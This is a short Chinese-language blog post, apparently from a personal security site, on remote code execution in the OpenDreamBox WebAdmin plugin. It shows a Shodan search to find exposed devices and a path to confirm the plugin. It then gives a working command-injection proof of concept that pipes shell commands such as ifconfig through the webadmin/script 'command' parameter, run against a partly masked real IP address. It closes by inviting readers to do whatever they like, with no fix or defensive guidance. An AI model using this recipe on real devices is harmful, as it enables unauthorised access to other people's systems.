---
title: OpenDreamBox-WebAdmin远程代码执行
layout: post
tags:
  - sec
  - hack
  - RemoteCodeExecution
  - linux
  - OpenDreamBox
category: 
  - hack
  - sec
comments: true
share: true
description: OpenDreamBox的插件WebAdmin远程代码执行
---

* TOC
{:toc}
OpenDreamBox的插件WebAdmin远程代码执行
<!--more-->


## 搜索漏洞

使用shodan搜索`"Dreambox 200 ok"`：

![shodan](/img/hack/远程代码执行/DreamBox/Dreambox_webadmin.png)

## 攻击

### 验证漏洞

若在url为`http://**.125.96.***:8889`填入`/webadmin/#!/ipk/installed`能显示出：


![ipk_installed](/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/DreamBox/ipk_installed.png)

就可以构造POC：`http://**.125.96.***:8889/webadmin/script?command=|命令`。比如`http://**.125.96.***:8889/webadmin/script?command=|ifconfig`:

![](/img/hack/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/DreamBox/ifconfig.png)

接下来就是可以做一些自己可以做的事情。。


